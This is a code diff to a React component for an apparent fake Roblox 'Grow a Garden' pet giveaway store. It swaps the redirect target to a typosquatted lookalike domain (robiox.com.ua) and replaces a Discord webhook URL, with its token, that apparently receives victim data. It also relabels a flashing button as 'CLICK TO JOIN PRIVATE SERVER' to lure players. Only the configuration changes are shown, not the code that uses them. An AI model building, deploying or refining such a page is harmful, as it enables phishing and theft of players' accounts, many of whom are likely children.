@@ -118,13 +118,13 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=88194787890806775494272714227711",
+  url: "https://www.robiox.com.ua/users/3771956351/profile",
 }
 
 // Webhook configuration
 const WEBHOOK_CONFIG = {
   enabled: true,
-  url: "https://discord.com/api/webhooks/1403233109851242536/in5ZcRi5sj9lVb6CyYYu7pra71aJaEjleY_3GlJI8uNKzfF1cCG9SeHdn6oF8V0wWv5A",
+  url: "https://discord.com/api/webhooks/1409478104715497594/UxKN57KqXtTZLx0_S7vlNoLMgM9iQfgFi-enjn_uoKvTOQqSpbElyaWSmtpcO033JzgB",
 }
 
 export default function PetSeedStore() {
@@ -578,7 +578,7 @@ export default function PetSeedStore() {
                 onClick={confirmClaim}
                 className="flex-1 bg-red-500 hover:bg-red-600 text-white font-bold h-12 sm:h-auto animate-pulse"
               >
-                🚀 CLICK TO REDIRECT NOW...
+                🚀 CLICK TO JOIN PRIVATE SERVER...
               </Button>
             </div>
           </div>
